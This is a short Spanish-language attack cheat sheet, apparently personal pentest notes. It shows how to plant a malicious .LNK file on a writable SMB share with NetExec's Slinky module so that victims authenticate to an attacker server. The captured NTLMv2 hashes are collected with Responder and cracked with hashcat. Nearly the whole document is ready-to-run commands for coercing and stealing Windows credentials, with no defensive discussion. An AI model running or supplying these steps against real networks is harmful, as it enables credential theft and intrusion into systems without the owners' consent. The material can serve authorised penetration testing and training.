# SMB Writable Share -> Slinky -> Malicious LNK

Tags: #AD #Windows #Relay #SMB  #Responder 

**Slinky** es un módulo de NetExec que permite abusar de un **SMB share escribible** colocando un archivo `.LNK` especialmente preparado.

El objetivo es provocar que un usuario/equipo que interactúe con el recurso genere una **conexión SMB saliente**, pudiendo provocar una autenticación **NTLM** hacia un servidor controlado por el atacante.

## Requisitos

- Credenciales válidas para acceder al SMB share.
- Acceso al recurso SMB.
- **Permiso de escritura (`WRITE`) sobre el SMB share/directorio objetivo.**
- Una víctima que interactúe con el recurso o con el `.LNK`.
- Un servidor/listener controlado por el atacante para recibir la autenticación.

> [!IMPORTANT]
> `READ` permite enumerar/leer el recurso, pero **`WRITE` es el permiso importante para plantar el `.LNK`**.

## Attack Flow

```text
Valid Credentials
       ↓
SMB Share Enumeration
       ↓
Writable Share
       ↓
Plant malicious .LNK
       ↓
Victim interacts with Share/LNK
       ↓
SMB/NTLM Authentication
       ↓
Attacker-controlled Server
       ↓
Capture NTLM Authentication
       ↓
Cracking / Relay / Further Attack
```

## Netexec

```bash 
Paso 1:
# Verificar que exista un dir con permisos 'READ / WRITE'
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' --shares 

Paso 3:
# Plantar el LNK (Link) malicioso
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' -M slinky -o NAME=<NAME> SERVER=IP_Kali  

	# NAME   = Nombre del archivo .LNK que Slinky crea
	# SERVER = Servidor al que apuntará el .LNK para provocar la conexión
	# SHARES = Nombre del dir con permisos WRITE (opcional)
```

## Responder (**NTLMv2** hash)

```bash 
Paso 2: 
# Escuchar las conexiones que lleguen a la interfaz VPN 'tun0'
❯ responder -I tun0
```

## Cracking 

```bash 
Paso 4:
# Crackear el hast obtenido del 'Responder' 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule
```